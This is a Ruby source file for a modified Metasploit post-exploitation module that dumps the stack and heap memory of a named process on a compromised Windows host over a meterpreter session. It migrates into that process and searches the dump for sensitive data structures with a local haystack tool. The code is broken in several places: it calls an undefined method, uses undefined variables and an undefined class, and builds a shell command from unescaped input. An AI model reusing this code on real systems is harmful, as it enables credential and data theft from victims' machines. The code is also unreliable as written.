##
# $Id: memory_grep.rb 13335 2011-07-25 15:29:18Z bannedit $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Post

	def initialize(info={})
		super( update_info(info,
			'Name'           => 'Windows Gather Process Memory Haystack Search',
			'Description'    => %q{ 
			    This module allows for searching the memory space of a proccess for potentially sensitive 
			      data. 
			      Its originaly memory_grep.rb
			  },
			'License'        => MSF_LICENSE,
			'Author'         => ['bannedit','jal'],
			'Version'        => '$Revision: 14000 $',
			'Platform'       => ['windows'],
			'SessionTypes'   => ['meterpreter' ]
		))
		register_options(
			[
			  OptString.new('PROCESS', [true, 'Name of the process to dump memory from', nil]),
			  OptString.new('STRUCT', [true, 'Name of the C structure to search in that memoryDump', nil]),
			], self.class)
	end

	def run
		if session.type != "meterpreter"
			print_error "Only meterpreter sessions are supported by this post module"
			return
		end
		structName = datastore['STRUCT']

		print_status("Running module against #{sysinfo['Computer']}")
		outputFilename = run_dump
		run_haystack(structName, outputFilename)
		report
  end
  
  def run_dump
		target_pid = nil
		stack = []
		name = datastore['PROCESS']
		outputFilename = self.makeFilename
		target_pid = client.sys.process[name]

		print_status("Found #{datastore['PROCESS']} running as pid: #{target_pid}")

		if not target_pid
			print_error("Could not access the target process")
			return
		end

		process = session.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
		begin
			print_status("Walking process threads...")
			threads = process.thread.each_thread do |tid|
				thread = process.thread.open(tid)
				esp = thread.query_regs['esp']
				addr = process.memory.query(esp)
				vprint_status("Found Thread TID: #{tid}\tBaseAddress: 0x%08x\t\tRegionSize: %d bytes" % [addr['BaseAddress'], addr['RegionSize']]) 
				data = process.memory.read(addr['BaseAddress'], addr['RegionSize'])
				stack << {
							'Address' => addr['BaseAddress'],
							'Size' => addr['RegionSize'],
							'Handle' => thread.handle,
							'Data' => data
						}
					end
		rescue
		end

		# we need to be inside the process to walk the heap using railgun
		current = session.sys.process.getpid
		if target_pid != current
			print_status("Migrating into #{target_pid} to allow for dumping heap data")
			session.core.migrate(target_pid)
		end

		heap = []
		railgun = session.railgun
		heap_cnt = railgun.kernel32.GetProcessHeaps(nil, nil)['return']
		dheap = railgun.kernel32.GetProcessHeap()['return']
		vprint_status("Default Process Heap: 0x%08x" % dheap)
		ret = railgun.kernel32.GetProcessHeaps(heap_cnt, heap_cnt * 4)
		pheaps = ret['ProcessHeaps']

		idx = 0
		handles = []
		while idx != pheaps.length
			vprint_status("Found Heap: 0x%08x" % pheaps[idx, 4].unpack('V')[0])
			handles << pheaps[idx, 4].unpack('V')[0]
			idx += 4
		end

		print_status("Walking the heap... this could take some time")
		begin
			heap = []
			handles.each do |handle|
				lpentry = "\x00" * 42
				while (ret = railgun.kernel32.HeapWalk(handle, lpentry)) and ret['return']
					#print ret.inspect
					entry = ret['lpEntry'][0, 4].unpack('V')[0]
					size = ret['lpEntry'][4, 4].unpack('V')[0]
					data = process.memory.read(entry, size)

					vprint_status("Walking Entry: 0x%08x\t Size: %d" % [entry, size])
					heap << {'Address' => entry, 'Size' => size, 'Handle' => handle, 'Data' => data}
					lpentry = ret['lpEntry']
				end
			end
		rescue
		end
    
    ######### --- new code
    ## use haystack to search that struct.
    dumper = MemoryDumper.new

		stack.each do |mem|
		  # pathname = mem['Handle'].xxx ?,
      dumper.addMemory(mem['Data'], mem['Address'], mem['Address']+mem['Size'], '[stack]') 
		end

		heap.each do |mem|
      dumper.addMemory(mem['Data'], mem['Address'], mem['Address']+mem['Size'], '[heap]') 
		end

		print_status("Dumping stack and heap to #{outputFilename}")
    dumper.dumpMemfile(outputFilename)
    
    outputFilename
  end
  
  def launchHaystack( structName, filedumpname )
    localcmd = "haystack --string --dumpfile #{filedumpname} #{structName} search "
		print_status("Launching '#{localcmd}'")
    system (localcmd)

	end
	
	def report
	
	end
	
	def makeFilename
	  # TODO. use a file cache ?
		filenameinfo = "_#{name}_#{pid}_" + ::Time.now.strftime("%Y%m%d.%M%S")
	  # Create a directory for the logs
	  logs = ::File.join(Msf::Config.log_directory, 'scripts', 'proc_memdump')
	  # Create the log directory
	  ::FileUtils.mkdir_p(logs)
	  #Dump file name
	  dumpfile = logs + ::File::Separator + host + filenameinfo + ".dump"
  end
  

end
